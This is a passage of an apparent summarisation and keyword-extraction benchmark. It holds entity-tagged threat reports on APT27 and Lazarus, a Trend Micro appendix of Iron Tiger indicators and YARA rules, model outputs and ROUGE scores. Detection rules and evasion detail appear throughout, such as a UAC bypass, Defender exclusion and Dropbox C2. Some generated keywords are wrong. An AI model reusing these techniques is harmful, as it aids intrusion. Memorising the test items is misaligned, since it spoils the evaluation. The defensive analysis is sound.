remove."]}, {"split_name": "test", "sample_id": "test_124", "prompt_text": "Extract the keywords: www.cyberscoop.com /china - hacking - budworm - apt27 - nsa - threat/ [NORP] Chinese - linked hackers targeted [GPE] U.S. state legislature , researchers say By AJ [PERSON] Vicens \u22ee \u22ee [CARDINAL] 10/13/2022Chinese flag made by children holding up colored boards in [GPE] North [GPE] Korea on [DATE] Sept. 6 , [DATE] 2012 . ( Photo by [PERSON] Eric Lafforgue / Art In All Of Us / Corbis via [ORG] Getty [ORG] Images)A long - running [NORP] Chinese - linked cyberespionage group targeted a [GPE] U.S. state legislature \u2019s network in [DATE] July , marking the outfit \u2019s [ORDINAL] first confirmed attack against the [GPE] U.S. in [DATE] years , according to analysis published [DATE] Thursday . The findings from [ORG] the [ORG] Symantec [ORG] Threat [ORG] Hunter [ORG] Team point to a group the company refers to as [ORG] Budworm . Other researchers call the group [ORG] Bronze [ORG] Union , [GPE] APT27 , Emissary Panda , [PERSON] Lucky [PERSON] Mouse and [PERSON] Temp . Hippo . The group has operated since [CARDINAL] at [CARDINAL] least [CARDINAL] 2013 and is known for targeting a wide range of industries \u201c in support of its political and military intelligence - collection objectives . \u201dThe outfit has attacked \u201c a number of strategically significant targets \u201d over [DATE] the [DATE] last [DATE] six [DATE] months , [ORG] Symantec said , including the government of a [LOC] Middle [LOC] Eastern country , a multinational electronics manufacturer [PERSON] as1/2well as the unnamed [GPE] U.S. state legislature . [PERSON] Dick [PERSON] O\u2019Brien , principal intelligence analyst for [ORG] the [ORG] Symantec [ORG] Threat [ORG] Hunter [ORG] Team , declined to share additional details related to the attack , other than to say that it was an attack on its network , \u201c which presumably both legislators and employees had access to . \u201dIt \u2019s unclear if the operation against the legislature resulted in data theft or other lasting effects . The findings come as [GPE] U.S. officials warn that [NORP] Chinese hacking activity represents a growing and troubling threat . [ORG] National [ORG] Security [ORG] Agency cyber chief [PERSON] Rob [PERSON] Joyce told reporters [DATE] last [DATE] week that [GPE] China has become \u201c really brazen , doubling down on their activities to steal intellectual property and compromise sensitive networks . \u201dThe comments came after the [ORG] NSA , [ORG] FBI and [ORG] the [ORG] Cybersecurity [ORG] Infrastructure [ORG] and [ORG] Security [ORG] Agency published the top vulnerabilities that [NORP] Chinese - linked cyber operators use to target [GPE] U.S. and allied networks . The notice reported that the agencies assess that these efforts represent \u201c [CARDINAL] one of the largest and most dynamic threats to [GPE] U.S. government and civilian networks , \u201d particularly with respect to telecoms , defense industrial base organizations and other critical infrastructure entities . [NORP] Chinese - aligned hacking groups represent a sprawling and active adversary to government and private institutions around the world . Activities ranging from espionage to disinformation to ransomware ( potentially as a cover for other activity and sometimes perhaps as a money - making effort on the side ) have been well documented in [DATE] recent [DATE] years , attributable to a range of overlapping and fluid [PERSON] Chinese- linked groups . In [DATE] November [DATE] 2021 , researchers with [ORG] Palo [ORG] Alto [ORG] Networks said tools and tactics similar to those used by APT27 were involved in cyberespionage efforts against [GPE] U.S. targets in [DATE] September [DATE] of [DATE] last [DATE] year , but no definitive links were established at the time . O\u2019Brien told [PRODUCT] CyberScoop that his team agreed with [GPE] Palo [GPE] Alto \u2019s assessment of that situation , but added that \u201c in this case , we \u2019re confident that what we \u2019re seeing is [ORG] Budworm . \u201dThe recent attacks [NORP] Symantec attributes to [ORG] Budworm took advantage of [CARDINAL] two Log4j vulnerabilities to compromise [PRODUCT] Apache [PRODUCT] Tomcat service on servers and install web shells . From there , the group installed malware from the [FAC] HyperBro malware family , as well as the PlugX / Korplug remote access trojan , the researchers said . \u201cBudworm is known for mounting ambitious attacks against high - value targets , \u201d the researchers said . \u201c While there were frequent reports of [ORG] Budworm targeting [GPE] U.S. organizations [DATE] six [DATE] to [DATE] eight [DATE] years [DATE] ago , in [DATE] more [DATE] recent [DATE] years the group \u2019s activity appears to have been largely focused on [LOC] Asia , [LOC] the [LOC] Middle [LOC] East , and [LOC] Europe \u2026 A resumption of attacks against U.S.-based targets could signal a change in focus for the group . \u201d2/2", "generated_text": "Chinese-linked cyberespionage group; spear; Budworm; Bronze Union; APT27; Emissary Panda; Lucky Mouse; Temp. Hippo; July; the group; the U.S. state legislature; the attack; the group; at least 2013; industries; the attack; data; victims; the attack; government; networks; infrastructure; techniques; logging; the group; tools; the HyperBro malware family; access; the malicious code; the group; a variety; vulnerabilities; the NSA; the FBI; Cybersecurity Infrastructure; Security Agency; tools; espionage; military; assets; compromise; the threat actors; communication; operation; tactics; the investigation; a renewed threat; the group; attacks.", "ref_text": "<START-1>Cybersecurity firm Symantec reported that a Chinese state-sponsored hacking group known as Budworm or APT27 targeted a U.S. state legislature's network in July 2022. This marks the first confirmed attack by the group against U.S. targets in years, though Budworm has been active since at least 2013. The group typically targets industries and organizations to collect intelligence and has recently hit a Middle Eastern government, an electronics manufacturer, and now a U.S. state legislature. The specific details and effects of the attack on the legislature are unclear, but it involved compromising Apache Tomcat servers and deploying malware like HyperBro and PlugX. U.S. officials have warned of increasing Chinese cyber espionage threats aimed at stealing intellectual property and compromising sensitive networks. While Budworm was linked to frequent attacks on U.S. organizations years ago, it recently focused on Asia, the Middle East, and Europe. The legislature attack could signal a renewed focus on the U.S. The report concludes Budworm is a sophisticated, Chinese-linked threat actor that poses an active threat to government and private sector networks, as evidenced by this latest attack on a U.S. state legislature. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5898123324396782, "gpt3/lexical/rouge_rouge2": 0.21024258760107814, "gpt3/lexical/rouge_rougeL": 0.35924932975871304, "gpt3/lexical/rouge_rougeLsum": 0.35924932975871304, "gpt3_generated_text": ["A Chinese-linked cyberespionage group known as Budworm, also referred to as Bronze Union, APT27, Emissary Panda, Lucky Mouse, and Temp. Hippo, conducted a targeted attack on a U.S. state legislature's network in July. This attack marked the group's first confirmed operation against the U.S. since at least 2013. The group has a history of targeting various industries in support of political and military intelligence collection objectives. Recent attacks by the group have exploited Log4j vulnerabilities to compromise servers and install web shells, followed by malware from the HyperBro family and the PlugX/Korplug remote access trojan. The group's activities have targeted government networks, critical infrastructure, and a variety of organizations globally. The NSA, FBI, and Cybersecurity Infrastructure and Security Agency have identified Chinese-linked cyber operators as a significant threat to U.S. government and civilian networks, particularly in the telecom and defense sectors. The recent attack on the U.S. state legislature signals a renewed threat from the group, with a potential shift in focus back towards U.S.-based targets."]}, {"split_name": "test", "sample_id": "test_125", "prompt_text": "Extract the keywords: Analysis of Suspected Lazarus Attacks Against South Koreamp-weixin-qq-com.translate.goog/s/w-KF5HUNe8-KlmFl6zLkZwAntiy [ORG] CERT [ORG] Antiy [ORG] Group 2022 - [DATE] 11 - 01 12:47 Posted in [GPE] Beijing Recently , [ORG] Antiy [ORG] CERT discovered an attack activity against [GPE] South [GPE] Korea . The title of the decoy document is \" Sogang KLEC.docx \" ( [ORG] Sogang [ORG] University [ORG] Korean [ORG] Language [ORG] Education [ORG] Center.docx ) . Analyze and judge the obtained samples and associated malicious payloads , and finally associate them with the [ORG] Lazarus organization . Lazarus organization , also known as [ORG] HIDDEN [ORG] COBRA , [ORG] APT38 , [PERSON] Zinc , [NORP] Guardians of Peace , etc . , is one of the most active [ORG] APT organizations in the peninsula region . The organization 's attack targets involve [CARDINAL] dozens of countries such as [GPE] Poland , [GPE] Chile , [GPE] the [GPE] United [GPE] States , [GPE] Mexico , [GPE] Brazil , etc . , and carry out targeted attacks on financial institutions and individuals such as banks and Bitcoin exchanges to obtain economic benefits . It is the largest financial institution in the world . [CARDINAL] one of the threats . In addition , the group also infiltrated institutions and enterprises such as aerospace , COVID-19 vaccine technology , government , media , etc . to steal important information and carry out sabotage and extortion.0 2 Attack process The attack flow of this attack is roughly as follows:1 . Using template injection , wait for the decoy document to be opened and download the malicious template constructed by the attacker to the host for execution.2 . The macro code in the template requests the specified URL , downloads the malicious payload and injects it into WINWORD.exe for execution.3 . The downloaded malicious payload is mainly used to release the download tool IEUpdate.exe and execute it , and add it to the registry [ORG] RUN for persistence.4 . After IEUpdate.exe is executed , it sends a message to obtain the C2 used for subsequent communication , and downloads different malicious payloads for execution according to the returned information.5 . There are [CARDINAL] two known payloads , hvncengine.dll and shellengine.dll , which are used to communicate with [CARDINAL] C2 for remote control.1/33Figure [CARDINAL] 2 - 1 Schematic diagram of the attack flow03 the decoy document was found . The information indicates that the decoy document was downloaded from the large attachment storage site provided by [ORG] Naver [ORG] Mail . It is speculated that the attacker may send phishing emails through [ORG] Naver [ORG] Mail to attack . [ORG] Naver [ORG] Mail is known to be an email service provided by the [NORP] South [NORP] Korean internet group [ORG] Naver [ORG] Corporation . Figure 3\u20111 Decoy document download linkSaniTOX is a security protection software from [GPE] South [GPE] Korea 's Jiransecurity company . The decoy document imitates SaniTOX to induce victims to enable macros . The main content of the malicious document is as follows . Figure [CARDINAL] 3 - 2 The main content of the decoy document of this attackAfter correlating the content of the document body , it is found that the body content of the decoy document appears not for the [ORDINAL] first time.3/33Figure [CARDINAL] 3\u20113 The main content of the decoy document in past attacks The attacker uses Word template injection to download and execute the malicious template after the victim opens the decoy document . The address of the template is document is opened . The main function of the macro code is to download malicious payloads . If the download is successful , the downloaded malicious payloads will be injected into the [ORG] Winword program for execution . Figure [CARDINAL] 3\u20115 Download malicious payloadThis function injects the downloaded malicious payload into [ORG] WinWord for execution.5/33Figure 3 - 6 Injection functionThe malicious payload injected into the [PERSON] Winword process will release the IEUpdate.exe and error.log files [PERCENT] under [PERCENT] % LocalAppData%\\Microsoft\\PlayReady , and then bypass [ORG] UAC through fodhelper.exe to elevate the permissions of IEUpdate.exe to execute , in the error.log file Some URL links \" s / ucnpe74wo87d3mm / server.txt?dl=0 \" that need to be bypass part of the sandbox that modifies the sleep time . Figure [CARDINAL] 3\u201110 Sandbox detectionObtain the device description information of the main hard disk , and concatenate it with \" VDEVICE \" . The concatenated string is hashed with [ORG] CRC and then concatenated with \" 0 \" . The format is \" 0+CRC hashed value\" . Figure [CARDINAL] 3 - [CARDINAL] 11 Obtain host information and generate host [ORG] IDDetermine whether it has administrator privileges by creating a directory under the system directory.8/33Figure 3 - 12 Permission JudgmentGet the version information of the operating system . Figure [CARDINAL] 3 - 13 Obtaining OS version informationObtain a process snapshot and determine whether the currently running process contains \" v3l4sp.exe \" , \" AYAgent.aye \" , and \" IEUpdate.exe \" . Among them , \" v3l4sp.exe \" is a subprogram of the free antivirus software [PRODUCT] V3 [PRODUCT] Lite of the [NORP] Korean company [ORG] AhnLab , and \" AYAgent.aye \" is a part of the Internet security suite [PERSON] ALYac of the [NORP] Korean company [ORG] ESTsoft . Figure [DATE] 3 - 14 [DATE] Detection of designated anti - virus softwareIf the path is \" % LocalAppData%\\Microsoft\\PlayReady\\IEUpdate.exe \" and the process ID does not match the current process , close the previous IEUpdate.exe process.9/33Figure 3 - 15 Close the previous processSet the flag according to whether \" /s \" and \" /a \" are included in the parameters of cmdline , and select different branches to execute according to the previously set administrator permission flag . Figure [CARDINAL] 3 - 16 Set the mark according to the parameterDetermine whether the previous privilege escalation operation was successful . If you have administrator rights , it will add itself to the Windows Defender exclusion list via [ORG] PowerShell commands.10/33Figure [PERSON] 3\u201117 [PERSON] Add this file to [ORG] Windows [ORG] Defender whitelistIf you are not an administrator , create a new thread and execute it in a loop , as shown below . Figure [CARDINAL] 3 - 18 Creating a threadThe thread creates another thread function , which is used to communicate with the C2.First , splicing \" dl.dropboxusercontent.com \" with the content obtained from the error.log file , and obtaining the [CARDINAL] C2 address of the next communication from the URL formed after splicing . Figure [CARDINAL] 3\u201119 Obtaining the [CARDINAL] C2 address from [ORG] Dropbox11/33Then return the operating system version information , whether there is a specified antivirus software , and the previously generated uid as the online package . Figure [CARDINAL] 3 - 20 Constructing the online packageThe online package return function will send the collected information to post2.php . Figure [DATE] 3 - 21 Sending an online packageThen receive data from the spliced URL , process the data , and obtain the content after the [ORDINAL] third \" % \" in the data , and use \" \\r \" and \" [PRODUCT] \\n \" as the terminators . This content will serve as the resource address for subsequent download URLs . Get the [NORP] Arabic numerals of numbers 0 - 9 , and get the instruction ID after processing.12/33Figure 3 - 22 Sending a request and receiving a command from C2Execute the issued command cyclically , and will judge whether to repeat the execution.13/33Figure 3 - 23 Execute the command issued by C2Download the dll file and select the export function to execute.14/33Figure 3 - 24 Download subsequent load executionThe information of the above samples was searched through the public intelligence platform , and [CARDINAL] two files were found in the [ORG] PCAP file associated with the decoy document , which should be malicious payloads downloaded by IEUpdate.exe , and they have the same return data structure and decryption algorithm . Table 3 - 4 Return data structure15/33offset to headerlength ( [ORG] byte)explain0x00xC0x140x180x1C0xC0x80x40x4sizeFixed data , decrypted as ) ( * & POIU : [ORG] LKJFixed data , replaceable with received data on demandThis part of the data is determined according to the content of the executionThe length of the returned data ( size)returned data0x1C+size0xCFixed data , decrypted to ^%$#YTREHGFDDuring the process of returning the file , the data structure of the returned data will be adjusted appropriately , as shown in the following figure . Table 3 - 5 File return data structureoffset to headerlength ( byte)explain0x00xC0x140x1C0x200xC0x80x80x4Fixed data , decrypted as ) ( * & POIU : [ORG] LKJFixed data , replaceable with received data on demandoverall file sizefile path lengthsize1file path ( size1)0x20+size10x28+size10x80x4the position of the current file pointerThe size of the current read file content ( size2)16/330x2C+size1size2read file content0x2C+size1+size2 [CARDINAL] 0xCFixed data , decrypted to ^%$#YTREHGFDThe positions of \" ) ( * & POIU : [ORG] LKJ \" and \" [ORG] ^%$#YTREHGFD \" on the keyboard are shown in the figure below . Figure [CARDINAL] 3 - 25 The position of the fixed content in the returned data structure on the used to close the socket connection and wait for the thread . [ORG] SEStart is the main function of the load , which is used to communicate with the C2 to realize the hvnc function . After the sample runs , it [ORDINAL] first generates a string with the host ID like IEUpdate.exe . Figure [CARDINAL] 3 - 26 Obtain host information and generate host [TIME] IDEvery [TIME] ten [TIME] minutes , a malicious function is executed . Figure [DATE] 3 - 27 Setting the interval timeCreate a desktop with the above string with the host ID as the name.18/33Figure [DATE] 3 - [DATE] 28 Create a new desktopAfter entering the thread function , like IEUpdate.exe , read the content in \" error.log \" and splicing it with \" dl.dropboxusercontent.com \" , obtain the [CARDINAL] C2 address through GET request , and then try to connect through socket . Figure [CARDINAL] 3\u201129 Get C2 from [ORG] Dropbox and connectIf the connection is successful , the previously generated host identifier will be sent over the socket and the current thread 's association with the desktop will be set.19/33Figure 3 - 30 Sending a specific stringReceive commands from the server in turn to realize the function of hvnc . Figure [DATE] 3 - 31 Receive command parsing and executionDifferent operations are presented according to the issued commands . The reverse malicious function . Figure [CARDINAL] 3 - 35 [GPE] Threads that implement malicious functionsSame as the previous [CARDINAL] two samples , the content in \" error.log \" is still read and then spliced with \" dl.dropboxusercontent.com \" , the C2 for subsequent communication is obtained from this address , and the socket connection is attempted.24/33Figure [CARDINAL] 3\u201136 Get C2 from [ORG] Dropbox and connectIf a socket connection can be established , it will receive commands from the server and implement different malicious functions according to the commands.25/33Figure [CARDINAL] 3 - 37 Implementing different malicious functions according to instructionsDifferent operations are presented according to the issued commands . The reverse analysis commands and corresponding functions are roughly as follows . Table [PERCENT] 3 - 9 Commands and corresponding functionsOrder Function0x1According to the received data , change the [CARDINAL] 8 bytes at offset 0xC of the returned data structure0x2Restart the cmd.exe process or execute the command line through cmd.exe0x4Get a list of disks or get a list of subdirectories and file names in a specified [PERSON] directory0x6Get the specified file0xAGet screenshot information0xBSet a marker to stop taking screenshots0xDSimulate mouse clicks0xESimulate mouse movement0xFModify the parameters of image conversion0x14Change the 8 bytes at offset 0xC of the return data structure to the data stored in the [ORG] sample0x1Ereturn chrome key0x1F Get the files in the specified [ORG] directory04 [ORG] Traceability analysis26/33Through the similarity of pdb paths and the same custom encryption function , it can be inferred that the [CARDINAL] three [ORG] PE files involved in the attack should belong to the same attacker . According to the high similarity between the [ORG] VBA code and the IEUpdate.exe download tool code contained in the template file and the code of the corresponding files in the previous attack activities of the [ORG] Lazarus organization , it is speculated that this attack activity also belongs to the [ORG] Lazarus organization . The pdbs of the [CARDINAL] three files , IEUpdate.exe , hvncengine.dll , and shellengine.dll , are all in the same directory . Figure [CARDINAL] 4\u20111 pdb of IEUpdate.exeFigure 4\u20112 pdb of [PERSON] hvncengine.dllFigure [PERSON] 4\u20113 [PERSON] pdb of shellengine.dll27/33The custom encryption functions of hvncengine.dll and shellengine.dll are exactly the same , but the keys used are different . The key of IEUpdate.exe and shellengine.dll is \" LNfYIU \" , and the key of hvncengine.dll is \" WhdeEg\" . Figure [CARDINAL] 4 - 4 Custom encryption functionThe template files with malicious macros and the IEUpdate.exe download tool are mostly similar to the sample code previously discovered by the [ORG] Lazarus group . Figure [CARDINAL] 4\u20115 vba code involved in this attackFigure 4\u20116 VBA code [ 2]28/33Figure 4\u20117 The download tool code involved in this attack29/33Figure 4\u20118 Download tool code involved in previous attacks[2]0 [CARDINAL] 5 Threat Framework Mapping The [PERSON] ATT&CK framework map of the behavioral technical points of the [ORG] Lazarus organization - related attack activities is as follows:30/33Figure [CARDINAL] 5 - 1 [ORG] Lazarus organization 's attack activity corresponding to the [ORG] ATT&CK threat framework mapThis series of activities involves a total of [CARDINAL] 28 technical points in [CARDINAL] 11 stages in the [PERSON] ATT&CK framework . The specific behaviors are described in the following table : Table [CARDINAL] 5 - 1 ATT&CK technical behavior description tableATT&CK Stage / Categoryspecific behaviorNotesresource developmentget infrastructureUse [ORG] DropBox to store the [CARDINAL] C2 address of subsequent connectionsinitial visitPhishingSpeculation may use phishing emails to spread decoy filesinitial visitwatering hole attackSpeculation that decoy files may be spread through watering hole attacksimplementimplementUse inter - process communicationThe shellengine.dll backdoor can execute cmd commands through pipesinduce users to executeInduce users to open a decoy document constructed by the attackerPersistenceBootstrap or login with autostartPersistence by modifying registry startup keysescalation of rightsAbuse of [ORG] Elevated [ORG] Control [ORG] PrivilegesBypassing [ORG] UAC via fodhelper.exeescalation of rightsprocess injectionInject IEUpdate.exe into the WINWORD.exe processdefensive evasiondefensive evasionAbuse of [ORG] Elevated [ORG] Control [ORG] PrivilegesBypassing [ORG] UAC via fodhelper.exeDeobfuscate / decode files or messagesThe key string of the sample species is encrypted by a custom algorithm31/33defensive mechanismsprocess injectionModify [WORK_OF_ART] Windows [WORK_OF_ART] Defender 's whitelistInject IEUpdate.exe into the WINWORD.exe processtemplate injectionUsing template injection to load remote malicious template executionVirtualization / [PERSON] Sandbox [PERSON] EscapeAvoid some sandboxes by judging whether the sleep delay is successfulSteal web session cookiessteal chrome cookiesDiscover the application windowDiscover application windows for remote desktop controlDiscover files and directoriesDiscover files and directories in the target machinediscovery processDiscover process information in the target machineQuery the registrytarget machine foundDiscover system informationDiscover the system version and other information of the target machineDiscover system owner / userfind system timeFind the current user of the target machineFind the current system time of the target machineVirtualization / [PERSON] Sandbox [PERSON] EscapeAvoid some sandboxes by judging whether the sleep delay is successfulcollectCollect local system dataCollect data such as system version , username , file list , files , etc.collectinput captureCapture mouse and keyboard messages32/33collecttake screenshottake screenshotcommand and controlUse application layer protocolsUse socket to communicate with [NORP] C2data exfiltrationBackhaul using C2 channelThe data is also sent back through the C2 The [ORG] Lazarus group is the top hacker gang in the peninsula region , focusing on long - term and persistent cyberattacks against specific targets , with the purpose of stealing funds and achieving political goals . It is one of the biggest threats to global financial institutions . In this attack , the [ORG] Lazarus group used a multi - stage download tool and obtained the [CARDINAL] C2 address through [ORG] Dropbox , which made it more difficult to obtain the attack payload . At the same time , there were behaviors of detecting the designated anti - software components and sandboxes in the sample , which interfered with the analysis . The sample also uses fodhelper.exe to bypass [ORG] UAC to escalate the privileges of malicious processes , making the attack more difficult to detect by means of process injection and changing the exclusion list of [ORG] Windows [ORG] Defender . The anti - virus software [ORG] ALyac and [ORG] Ahnlab detected in the sample are both popular anti - virus software in [GPE] South [GPE] Korea . Combined with the name of the decoy file \" Sogang KLEC.docx \" and the pictures in the text of the decoy document , it can be inferred that this is an attack against [GPE] South [GPE] Korea . References:[1 ] \ud55c\uad6d\uc778\ud130\ub137\uc815\ubcf4\uc13c\ud130 ( KRNIC)\ub97c\uc0ac\uce6d\ud55c\uc815\ubcf4\uc218\uc9d1\uc545\uc131\uc774\uba54\uc77c\uc8fc\uc758 ! ! ( \ubcc0\uc885\ub0b4\uc6a9\ucd94\uac00 ) url [PERSON] Snow and gluttony : Analysis of suspected [ORG] Lazarus attacks against [NORP] Korean companies url companies/33/33", "generated_text": "analysis; analysis; Lazarus; infection; South Korea; the decoy document; Sogang University Korean Language Education Center.docx; download; macros; WINWORD.exe; persistence; IEUpdate.exe; the C2; the C2; a string; a full shell; the C2; the key; location; espionage; a phishing email; Naver; the macro code; infection.", "ref_text": "<START-1>This PDF document is about a cyber attack carried out by an attacker using a Trojan/Generic.ASHMacro.7D6 decoy document to trick victims into enabling macros and downloading malicious payloads. The document used a template injection technique to download a malicious template that contained macros. The macros executed to download malware.The attacker also uses a template file with malicious macro code that downloads and injects payloads into Microsoft Word when opened.Dropbox to download additional payloads. Further payloads like hvncengine.dll and shellengine.dll provide remote access, command execution, screenshot capture, and data exfiltration capabilities.Attribution links these attacks to the North Korean APT Lazarus through code similarities with previous Lazarus campaigns. Decoy content suggests targeting South Korean entities. The attacks aim to gain persistent access to systems for cyberespionage. Tactics include process injection, sandbox evasion, disabling AV, and masquerading as legitimate software. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5093167701863354, "gpt3/lexical/rouge_rouge2": 0.15625, "gpt3/lexical/rouge_rougeL": 0.2422360248447205, "gpt3/lexical/rouge_rougeLsum": 0.2422360248447205, "gpt3_generated_text": ["In a recent attack activity against South Korea, the Lazarus organization, also known as HIDDEN COBRA, APT38, Zinc, Guardians of Peace, targeted Sogang University Korean Language Education Center.docx as a decoy document. The attack process involved template injection, where the attacker downloaded a malicious template to the host for execution. The macro code in the template requested a specified URL to download the malicious payload and inject it into WINWORD.exe for execution. The downloaded payload, including hvncengine.dll and shellengine.dll, was used for remote control and communication with the C2 server. The decoy document was found to be downloaded from Naver Mail, indicating that the attacker may have used phishing emails through this email service. The attacker used Word template injection to download and execute the malicious template, injecting the payload into WinWord. The injected payload released IEUpdate.exe and error.log files, bypassed UAC, and modified the sleep time to evade sandbox detection. The attack aimed to obtain host information, generate a host ID, determine administrator privileges, and ultimately carry out espionage activities."]}, {"split_name": "test", "sample_id": "test_126", "prompt_text": "Extract the keywords: A TrendLabs ReportOperation Iron Tiger : Exploring Chinese Cyber - Espionage Attacks on [ORG] United [ORG] States [ORG] Defense [ORG] ContractorsAppendixTrendLabs [ORG] Security Intelligence BlogTrend Micro | Shadow Force Technical BriefOperation Iron Tiger is a targeted attack campaign discovered to have stolen [CARDINAL] trillions of data from defense contractors in the [GPE] US , including stolen emails , intellectual property , strategic planning documents data and records that could be used to destabilize an organization . This document serves as an appendix for our research paper Operation Iron Tiger : Exploring Chinese Cyber - Espionage Attacks on [ORG] United [ORG] States [ORG] Defense [ORG] Contractors . This appendix contains indicators of compromise and detection rules to detect some of the malware used by the threat actors during our investigation . [PERSON] Malware [PERSON] Hashes and DetectionsMD5SHA1785512dc380e303a37cd03b68a97 BKDR_MECA.AHKTL_ExPlugHKTL_IISExploitHKTL_HTRANVBS_WIMXEC.AHKTL_DNSTUNN EL TROJ_PLUGEX.CHKTL_PWDUMPTROJ_PLUGEX.CHKTL_PWDUMPHKTL_PROXYTROJ64_WICRED .B HKTL_PWDUMPBKDR_GHOST.ATrend Micro | Shadow Force Technical Briefcf56cb65c4e5b4d7794147daeed0b 2846HTML_ASPSPY.AHKTL_PWDUMPHKTL_DOSEMUHKTL_ASPXSPYHKTL_PWDUMPVBS_WIMXEC.AHKTL_IISEXPLOI HKTL_HTRanTrend Micro | Shadow Force Technical Brief78db8a38729861b3eaa8acc509a2 9ddaTROJ_PLUGEX.BHKTL_PWDUMPFraudulent domains / IP addresses\uf0b7 mac.pm\uf0b7 d99net.net\uf0b7 gameofthrones.ddns.net\uf0b7 user.qzone.qq.com/1479457083\uf0b7 ys168.com\uf0b7 * .shangxian.info\uf0b7 * .mai1.info\uf0b7 xssok.blogspot.com\uf0b7 phpxss.lofter.com\uf0b7 exenull1.appspot.com\uf0b7 chrome.servehttp.com\uf0b7 update.gtalklite.comYARA [ORG] RulesRule IronTiger_ASPXSpyrule [ORG] IronTiger_ASPXSpy { meta : author=\"Cyber [ORG] Safety [ORG] Solutions , Trend Micro \" comment=\"ASPXSpy detection . It might be used by other fraudsters\"Trend Micro | Shadow Force Technical Briefstrings:$str1=\"ASPXSpy \" nocase wide ascii $ str2=\"IIS Spy \" nocase wide ascii $ str3=\"protected void DGCoW(object sender , [ORG] EventArgs e ) \" nocase wide asciicondition : any of ( $ str*)}Rule IronTiger_ChangePort_Toolkit_driversinstallauthor=\"Cyber [ORG] Safety [ORG] Solutions , Trend Micro\"$mz=\"MZ\"meta : strings : rule [ORG] IronTiger_ChangePort_Toolkit_driversinstall } $ mz at 0 and ( 2 of ( $ str*))condition:$str1=\"openmydoor \" nocase wide ascii $ str2=\"Install service error \" nocase wide ascii $ str3=\"start remove service \" nocase wide ascii $ str4=\"NdisVersion \" nocase wide asciiRule IronTiger_ChangePort_Toolkit_ChangePortExerule IronTiger_ChangePort_Toolkit_ChangePortExe strings:$mz=\"MZ\"author=\"Cyber [ORG] Safety [ORG] Solutions , [ORG] Trend [ORG] Micro\"$str1=\"Unable to alloc the adapter ! \" nocase wide asciiTrend Micro | Shadow Force Technical Brief$str2=\"Wait for master fuck \" nocase wide ascii $ str3=\"xx.exe < HOST > < PORT > \" nocase wide ascii $ str4=\"chkroot2007 \" nocase wide ascii $ str5=\"Door is bind on % s \" nocase wide asciicondition:$mz at [DATE] 0 and ( 2 of ( $ str*))}Rule IronTiger_dllshellexc2010meta : rule [PERSON] IronTiger_dllshellexc2010 { strings:$mz=\"MZ\"}author=\"Cyber [ORG] Safety [ORG] Solutions , Trend Micro \" comment=\"dllshellexc2010 Exchange backdoor + remote shell\"$str1=\"Microsoft . Exchange . Clients . [ORG] Auth.dll \" nocase ascii wide $ str2=\"Dllshellexc2010 \" nocase wide ascii $ str3=\"Users\\\\ljw\\\\Documents \" nocase wide ascii$bla1=\"please input path \" nocase wide ascii $ bla2=\"auth.owa \" nocase wide asciicondition:($mz at 0 ) and ( ( any of ( $ str * ) ) or ( all of ( $ bla*)))Rule IronTiger_dnstunnelrule IronTiger_dnstunnel { meta : author=\"Cyber [ORG] Safety [ORG] Solutions , Trend Micro \" comment=\"This rule detects a dns tunnel tool used in Operation Iron Tiger\"strings:$mz=\"MZ\"Trend Micro | Shadow Force Technical Brief$str1=\"\\\\DnsTunClient\\\\ \" nocase wide ascii $ str2=\"\\\\t - DNSTunnel\\\\ \" nocase wide ascii $ str3=\"xssok.blogspot \" nocase wide ascii $ str4=\"dnstunclient \" nocase wide ascii$mistake1=\"because of error , can not analysis \" nocase wide ascii $ mistake2=\"can not deal witn the error \" nocase wide ascii $ mistake3=\"the other retun [CARDINAL] one RST \" nocase wide ascii $ mistake4=\"Coversation produce [CARDINAL] one error \" nocase wide ascii $ mistake5=\"Program try to use the have deleted the buffer \" nocase wide asciicondition:($mz at 0 ) and ( ( any of ( $ str * ) ) or ( any of ( $ mistake*)))}Rule IronTiger_EFH3_encoderauthor=\"Cyber [ORG] Safety [ORG] Solutions , Trend Micro\"$mz=\"MZ\"meta : strings : rule IronTiger_EFH3_encoder } condition:$str1=\"EFH3 [ HEX ] [ SRCFILE ] [ DSTFILE ] \" nocase wide ascii $ str2=\"123.EXE 123.EFH \" nocase wide ascii $ str3=\"ENCODER : b[i]:= \" nocase wide ascii$mz at 0 and ( any of ( $ str*))Rule IronTiger_GetPassword_x64rule IronTiger_GetPassword_x64 { meta : author=\"Cyber [ORG] Safety [ORG] Solutions , [ORG] Trend [ORG] Micro\"Trend [ORG] Micro | Shadow Force Technical Briefstrings:$mz=\"MZ\"$str1=\"(LUID ERROR ) \" nocase wide ascii $ [MONEY] str2=\"Users\\\\K8team\\\\Desktop\\\\GetPassword \" nocase wide ascii $ str3=\"Debug x64\\\\GetPassword.pdb \" nocase wide ascii$bla1=\"Authentication Package : \" nocase wide ascii $ bla2=\"Authentication Domain : \" nocase wide ascii $ bla3= \" * Password : \" nocase wide ascii $ bla4=\"Primary User : \" nocase wide asciicondition:$mz at 0 and ( ( any of ( $ str * ) ) or ( all of ( $ bla*)))}Rule IronTiger_GetUserInfoauthor=\"Cyber Safety Solutions , Trend Micro\"$mz=\"MZ\"meta : strings : rule [PERSON] IronTiger_GetUserInfo } condition:$str1=\"getuserinfo username \" nocase wide ascii $ str2=\"joe@joeware.net \" nocase wide ascii $ str3=\"If . specified for userid , \" nocase wide ascii$mz at 0 and ( any of ( $ str*))Rule IronTiger_Gh0stRAT_variantrule IronTiger_Gh0stRAT_variant { meta : author=\"Cyber [ORG] Safety [ORG] Solutions , [ORG] Trend [ORG] Micro\"Trend [ORG] Micro | Shadow Force Technical Briefstrings : comment=\"This is a detection for a s.exe variant seen in Op . Iron Tiger\"$mz=\"MZ\"$str1=\"Game Over Good Luck By Wind \" nocase wide ascii $ str2=\"ReleiceName \" nocase wide ascii $ str3=\"jingtisanmenxiachuanxiao.vbs \" nocase wide ascii $ str4=\"Winds Update \" nocase wide asciicondition:$mz at 0 and ( any of ( [MONEY] $ str*))}Rule [ORG] IronTiger_GTalk_Trojanauthor=\"Cyber [ORG] Safety [ORG] Solutions , Trend Micro\"$str1=\"gtalklite.com \" nocase wide ascii $ str2=\"computer=%s&lanip=%s&uid=%s&os=%s&data=%s \" nocase wide ascii $ str3=\"D13idmAdm \" nocase wide ascii $ str4=\"Error : PeekNamedPipe failed with % i \" nocase wide ascii$mz=\"MZ\"meta : strings : rule IronTiger_GTalk_Trojan } condition:$mz at [DATE] 0 and ( 2 of ( $ str*))Rule 